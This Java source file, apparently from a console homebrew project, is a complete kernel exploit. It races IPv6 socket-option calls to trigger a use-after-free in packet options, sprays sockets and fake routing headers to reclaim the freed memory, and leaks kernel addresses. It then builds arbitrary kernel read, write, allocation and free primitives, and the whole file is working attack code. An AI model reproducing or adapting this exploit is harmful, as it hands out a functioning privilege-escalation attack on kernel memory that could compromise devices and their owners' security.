package org.homebrew;

public class KernelRW extends Thread
{
    private static long getpid = F(0x2001, "getpid");
    private static long socket = F(0x2001, "socket");
    private static long close = F(0x2001, "close");
    private static long getsockopt = F(0x2001, "getsockopt");
    private static long setsockopt = F(0x2001, "setsockopt");
    private static long usleep = F(0x2001, "usleep");
    private static long kqueue = F(0x2001, "kqueue");
    private static long sceKernelSendNotificationRequest = F(0x2001, "sceKernelSendNotificationRequest");
    public long pktoptsLeak;
    public int kqueue_fd;
    public long kqueue_addr;

    private static long F(int dll, String name)
    {
        try
        {
            return NativeUtils.dlsym(dll, name);
        }
        catch(Exception e)
        {
            return 0;
        }
    }

    private static long C(long addr, long a, long b, long c, long d, long e, long f) throws Exception
    {
        return NativeStuff.callFunction(addr, a, b, c, d, e, f);
    }

    private static long C(long addr, long a, long b, long c, long d, long e) throws Exception
    {
        return NativeStuff.callFunction(addr, a, b, c, d, e, 0);
    }

    private static long C(long addr, long a, long b, long c, long d) throws Exception
    {
        return NativeStuff.callFunction(addr, a, b, c, d, 0, 0);
    }

    private static long C(long addr, long a, long b, long c) throws Exception
    {
        return NativeStuff.callFunction(addr, a, b, c, 0, 0, 0);
    }

    private static long C(long addr, long a, long b) throws Exception
    {
        return NativeStuff.callFunction(addr, a, b, 0, 0, 0, 0);
    }

    private static long C(long addr, long a) throws Exception
    {
        return NativeStuff.callFunction(addr, a, 0, 0, 0, 0, 0);
    }

    private static long C(long addr) throws Exception
    {
        return NativeStuff.callFunction(addr, 0, 0, 0, 0, 0, 0);
    }

    private static void die() throws Exception
    {
        throw new Exception("now dead");
    }

    private static int TCLASS_MASTER = 0x13370000;
    private static int TCLASS_MASTER_2 = 0x13380000;
    private static int TCLASS_SPRAY = 0x41;
    private static int TCLASS_TAINT = 0x42;
    private static int SPRAY_SIZE = 350;
    private static int SPRAY2_SIZE = 64;
    private static int SPRAY3_SIZE = 128;
    private static int SMALL_SPRAY = 64;

    private KernelRW master;

    private int master_sock;
    private int overlap_sock;
    private int victim_sock;
    private int[] spray_sock;
    private String log;
    private boolean triggered;
    private boolean done1;
    private boolean done2;
    private long cmsg;
    private long mem24;
    private long mem2048;
    private boolean ok;

    private void P(Throwable e)
    {
        try
        {
            java.io.StringWriter sw = new java.io.StringWriter();
            java.io.PrintWriter pw = new java.io.PrintWriter(sw);
            e.printStackTrace(pw);
            log += "\n" + sw + "\n";
        }
        catch(Throwable f)
        {
            log += "\nEXC\n";
        }
    }

    private static long calloc(int size) throws Exception
    {
        long ans = NativeUtils.allocateMemory(size);
        for(int i = 0; i < size; i++)
            NativeUtils.putByte(ans+i, (byte)0);
        return ans;
    }

    private static int new_socket() throws Exception
    {
        return (int)C(socket, 28, 2);
    }

    private int get_tclass(int sock, int which) throws Exception
    {
        NativeUtils.putInt(mem24+8*which, 0);
        NativeUtils.putInt(mem24+8*which+4, 4);
        if(C(getsockopt, sock, 41, 61, mem24+8*which, mem24+8*which+4) != 0)
            die();
        return NativeUtils.getInt(mem24+8*which);
    }

    private void set_tclass(int sock, int q) throws Exception
    {
        NativeUtils.putInt(mem24, q);
        if(C(setsockopt, sock, 41, 61, mem24, 4) != 0)
            die();
    }

    private void free_pktopts(int sock) throws Exception
    {
        if(C(setsockopt, sock, 41, 25, 0, 0) != 0)
            die();
    }

    private void use_thread() throws Exception
    {
        while(!triggered && get_tclass(master_sock, 1) != TCLASS_SPRAY)
        {
            if(C(setsockopt, master_sock, 41, 25, cmsg, 20) != 0)
                die();
            C(usleep, 100);
        }
        triggered = true;
        done1 = true;
    }

    private void free_thread() throws Exception
    {
        while(!triggered && get_tclass(master_sock, 2) != TCLASS_SPRAY)
        {
            free_pktopts(master_sock);
            C(usleep, 10000);
        }
        triggered = true;
        done2 = true;
    }

    private void trigger_uaf() throws Exception
    {
        cmsg = calloc(24);
        NativeUtils.putInt(cmsg, 20);
        NativeUtils.putInt(cmsg+4, 41);
        NativeUtils.putInt(cmsg+8, 61);
        NativeUtils.putInt(cmsg+16, 0);
        start();
        (new KernelRW(this)).start();
        for(;;)
        {
            for(int i = 0; i < SPRAY2_SIZE; i++)
                set_tclass(spray_sock[i], TCLASS_SPRAY);
            if(get_tclass(master_sock, 0) == TCLASS_SPRAY)
                break;
            for(int i = 0; i < SPRAY2_SIZE; i++)
                if(C(setsockopt, spray_sock[i], 41, 25, 0, 0) != 0)
                    die();
            C(usleep, 100);
        }
        log += "uaf: " + (get_tclass(master_sock, 0) - TCLASS_SPRAY) + "\n";
        triggered = true;
        while(!done1 || !done2);
    }

    private int fake_rthdr(int sz, long p16, int q192) throws Exception
    {
        int len = ((sz / 8) - 1) & ~1;
        for(int i = 0; i <= len; i++)
            NativeUtils.putLong(mem2048+8*i, 0);
        sz = (len + 1) * 8;
        NativeUtils.putInt(mem2048, 0x00800100*len);
        NativeUtils.putLong(mem2048+16, p16);
        NativeUtils.putInt(mem2048+192, q192);
        return sz;
    }

    private void set_rthdr(int sock, int sz) throws Exception
    {
        if(C(setsockopt, sock, 41, 51, mem2048, sz) != 0)
            die();
    }

    private long leak_kmalloc(int size) throws Exception
    {
        int sz = fake_rthdr(size, 0, 0);
        set_rthdr(master_sock, sz);
        NativeUtils.putInt(mem2048+256, 256);
        if(C(getsockopt, overlap_sock, 41, 51, mem2048, mem2048+256) != 0)
            die();
        //set_rthdr(master_sock, 0);
        return NativeUtils.getLong(mem2048+112);
    }

    public String notify(String s) throws Exception
    {
        long q = calloc(0xc30);
        NativeUtils.putInt(q+0x10, -1);
        for(int i = 0; i < s.length(); i++)
            NativeUtils.putByte(q+0x2d+i, (byte)s.charAt(i));
        C(sceKernelSendNotificationRequest, 0, q, 0xc30, 0);
        return s;
    }

    private void setStage(String s) throws Exception
    {
        notify(s);
        Thread.sleep(1000);
        log += "+ " + s + "\n";
    }

    public long kread8(long addr) throws Exception
    {
        long offset = 0;
        if((addr & 4095) >= 4076)
        {
            offset = (addr & 4095) - 4076;
            if(offset >= 12)
                offset = 12;
            addr -= offset;
        }
        NativeUtils.putLong(mem24, addr);
        NativeUtils.putLong(mem24+8, 0);
        NativeUtils.putInt(mem24+16, 0);
        if(C(setsockopt, master_sock, 41, 46, mem24, 20) != 0)
            die();
        NativeUtils.putLong(mem24, 0xdeaddeaddeadl);
        NativeUtils.putLong(mem24+8, 0xdeaddeaddeadl);
        NativeUtils.putInt(mem24+16, 0xdead);
        NativeUtils.putInt(mem24+20, 20);
        if(C(getsockopt, victim_sock, 41, 46, mem24, mem24+20) != 0)
            die();
        return NativeUtils.getLong(mem24+offset);
    }

    public boolean kwrite20(long addr, long a, long b, int c) throws Exception
    {
        if(a == 0 && b == 0 && c == 0)
            return false;
        NativeUtils.putLong(mem24, addr);
        NativeUtils.putLong(mem24+8, 0);
        NativeUtils.putInt(mem24+16, 0);
        if(C(setsockopt, master_sock, 41, 46, mem24, 20) != 0)
            die();
        NativeUtils.putLong(mem24, a);
        NativeUtils.putLong(mem24+8, b);
        NativeUtils.putInt(mem24+16, c);
        return C(setsockopt, victim_sock, 41, 46, mem24, 20) == 0;
    }

    public long kmalloc(int size) throws Exception
    {
        if(size > 2048)
            throw new Exception("too big");
        if(size < 32)
            size = 32;
        kwrite20(pktoptsLeak+112, 0, 1, 0);
        kwrite20(pktoptsLeak+120, 0, 1, 0);
        int sz = fake_rthdr(size, 0, 0);
        set_rthdr(victim_sock, sz);
        long addr = kread8(pktoptsLeak+112);
        kwrite20(pktoptsLeak+112, 0, 1, 0);
        kwrite20(pktoptsLeak+120, 0, 1, 0);
        return addr;
    }

    public void kfree(long ptr) throws Exception
    {
        kwrite20(pktoptsLeak+112, ptr, 0, 0);
        set_rthdr(victim_sock, 0);
    }

    private void leak_kqueue() throws Exception
    {
        java.util.ArrayList fds = new java.util.ArrayList();
        java.util.ArrayList allmems = new java.util.ArrayList();
        java.util.HashSet mems_set = new java.util.HashSet();
        long ans = 0;
        int count = 0;
        for(;;)
        {
            ans = 0;
            count = 0;
            mems_set.clear();
            int fd = -1;
            for(int i = 0; i < 10000; i++)
            {
                if(i == 5000)
                    fd = (int)C(kqueue);
                long addr = kmalloc(0x200);
                allmems.add(new Long(addr));
                mems_set.add(new Long(addr));
            }
            java.util.Iterator it = mems_set.iterator();
            while(it.hasNext())
            {
                long a1 = ((Long)it.next()).longValue();
                long a2 = a1 ^ 0x200;
                if(mems_set.contains(new Long(a2)))
                    continue;
                long q = kread8(a2);
                if(!(q >= -0x1000000000000l && q < -1 && (q & 0xfff) == 0xad3))
                    continue;
                if((kread8(q) & 0xffffffffffffffl) == 0x65756575716bl) // "kqueue\x00"
                {
                    ans = a2;
                    count++;
                }
            }
            notify("fd = "+fd+", ans = "+ans+", count = "+count);
            if(count == 1)
            {
                kqueue_addr = ans;
                kqueue_fd = fd;
                break;
            }
            fds.add(new Integer(fd));
        }
        java.util.Iterator it = fds.iterator();
        while(it.hasNext())
            C(close, ((Integer)it.next()).intValue());
        it = allmems.iterator();
        while(it.hasNext())
            kfree(((Long)it.next()).longValue());
    }

    public String main() throws Exception
    {
        notify("starting exploit");
        log = "";
        mem2048 = calloc(2048);
        for(int i = 64; i < 10000; i++)
            C(close, i);
        master_sock = new_socket();
        spray_sock = new int[SPRAY_SIZE];
        log += "sockets =";
        for(int i = 0; i < SPRAY_SIZE; i++)
            log += " " + (spray_sock[i] = new_socket());
        log += "\n";
        mem24 = calloc(24);
        for(int i = 1; i <= 3*SMALL_SPRAY; i++)
            set_tclass(spray_sock[SPRAY_SIZE-i], TCLASS_SPRAY);
        trigger_uaf();
        log += notify("uaf ok (?)")+"\n";
        for(int i = 0; i < SPRAY3_SIZE; i++)
            set_tclass(spray_sock[i], TCLASS_SPRAY);
        setStage("taint check");
        set_tclass(master_sock, TCLASS_TAINT);
        int overlap_idx = -1;
        for(int i = 0; i < SPRAY3_SIZE; i++)
            if(get_tclass(spray_sock[i], 0) == TCLASS_TAINT)
                overlap_idx = i;
        log += "overlap_idx = " + overlap_idx + "\n";
        setStage("rthdr spray 1");
        for(int i = SMALL_SPRAY+1; i <= 2*SMALL_SPRAY; i++)
            free_pktopts(spray_sock[SPRAY_SIZE-i]);
        int ns = new_socket();
        set_tclass(ns, TCLASS_SPRAY);
        free_pktopts(spray_sock[overlap_idx]);
        spray_sock[overlap_idx] = ns;
        int sz = fake_rthdr(256, 0, TCLASS_MASTER);
        for(int i = 0; i < SPRAY3_SIZE; i++)
        {
            NativeUtils.putInt(mem2048+192, TCLASS_MASTER|i);
            set_rthdr(spray_sock[i], sz);
        }
        int tcl = get_tclass(master_sock, 0);
        if((tcl & -65536) != TCLASS_MASTER)
        {
            log += notify("failed to reclaim master (spray 1)")+"\n";
            return log;
        }
        overlap_idx = tcl & 65535;
        overlap_sock = spray_sock[overlap_idx];
        log += "overlap_idx = " + overlap_idx + "\n";
        long leak = pktoptsLeak = leak_kmalloc(0x100);
        log += "pktoptsLeak = " + leak + "\n";
        setStage("rthdr spray 2");
        set_rthdr(master_sock, 0);
        for(int i = 2*SMALL_SPRAY+1; i <= 3*SMALL_SPRAY; i++)
            free_pktopts(spray_sock[SPRAY_SIZE-i]);
        for(int i = SPRAY3_SIZE; i < SPRAY_SIZE-SMALL_SPRAY; i++)
            set_tclass(spray_sock[i], TCLASS_SPRAY);
        set_rthdr(spray_sock[overlap_idx], 0);
        for(int i = 1; i <= SMALL_SPRAY; i++)
            free_pktopts(spray_sock[SPRAY_SIZE-i]);
        sz = fake_rthdr(256, leak+16, TCLASS_MASTER_2);
        for(int i = SPRAY3_SIZE; i < SPRAY_SIZE; i++)
        {
            NativeUtils.putInt(mem2048+192, TCLASS_MASTER_2|i);
            set_rthdr(spray_sock[i], sz);
        }
        tcl = get_tclass(master_sock, 0);
        if((tcl & -65536) != TCLASS_MASTER_2)
        {
            log += notify("failed to reclaim master (spray 2)")+"\n";
            return log;
        }
        overlap_idx = tcl & 65535;
        overlap_sock = spray_sock[overlap_idx];
        log += "overlap_idx = " + overlap_idx + "\n";
        setStage("finding victim");
        int victim_idx = -1;
        for(int i = SPRAY3_SIZE; i < SPRAY_SIZE; i++)
        {
            NativeUtils.putLong(mem24, 0);
            NativeUtils.putInt(mem24+20, 20);
            if(C(getsockopt, spray_sock[i], 41, 46, mem24, mem24+20) != 0)
                die();
            if(NativeUtils.getLong(mem24) != 0)
                victim_idx = i;
        }
        log += "victim_idx = " + victim_idx + "\n";
        if(victim_idx >= 0)
        {
            log += notify("victim found too early. we're fucked :-(")+"\n";
            return log;
        }
        NativeUtils.putLong(mem24, leak+16);
        NativeUtils.putLong(mem24+8, 0);
        NativeUtils.putInt(mem24+16, 0);
        if(C(setsockopt, master_sock, 41, 46, mem24, 20) != 0)
            die();
        victim_idx = -1;
        for(int i = SPRAY3_SIZE; i < SPRAY_SIZE; i++)
        {
            NativeUtils.putLong(mem24, 0);
            NativeUtils.putInt(mem24+20, 20);
            if(C(getsockopt, spray_sock[i], 41, 46, mem24, mem24+20) != 0)
                die();
            if(NativeUtils.getLong(mem24) != 0)
                victim_idx = i;
        }
        log += "victim_idx = " + victim_idx + "\n";
        if(victim_idx < 0)
        {
            log += notify("failed to identify victim")+"\n";
            return log;
        }
        victim_sock = spray_sock[victim_idx];
        /*setStage("closing sockets");
        spray_sock[victim_idx] = new_socket();
        for(int i = SPRAY2_SIZE; i < SPRAY_SIZE; i++)
            C(close, spray_sock[i]);*/
        setStage("leaking kqueue");
        leak_kqueue();
        notify("enjoy your krw");
        ok = true;
        return log;
    }

    public KernelRW(){}

    private KernelRW(KernelRW other)
    {
        master = other;
    }

    public void run()
    {
        try
        {
            if(master != null)
                master.free_thread();
            else
                use_thread();
        }
        catch(Throwable e)
        {
            if(master != null)
                master.P(e);
            else
                P(e);
        }
    }

    public boolean isOk()
    {
        return ok;
    }
}
